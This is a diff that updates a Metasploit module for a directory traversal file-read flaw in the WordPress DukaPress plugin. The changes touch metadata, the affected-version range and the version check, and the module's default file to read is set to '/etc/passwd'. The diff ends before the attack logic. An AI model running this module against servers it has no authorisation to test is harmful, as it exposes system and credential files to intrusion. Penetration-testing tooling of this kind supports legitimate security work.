@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
@@ -16,7 +13,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
       'Description'    => %q{
         This module exploits a directory traversal vulnerability in WordPress Plugin
-        "DukaPress" version 2.5.2, allowing to read arbitrary files with the
+        "DukaPress" version <= 2.5.3, allowing to read arbitrary files with the
         web server privileges.
       },
       'References'     =>
@@ -38,11 +35,11 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ], self.class)
+      ])
   end
 
   def check
-    check_plugin_version_from_readme('dukapress', '2.5.7')
+    check_plugin_version_from_readme('dukapress', '2.5.4')
   end
 
   def run_host(ip)
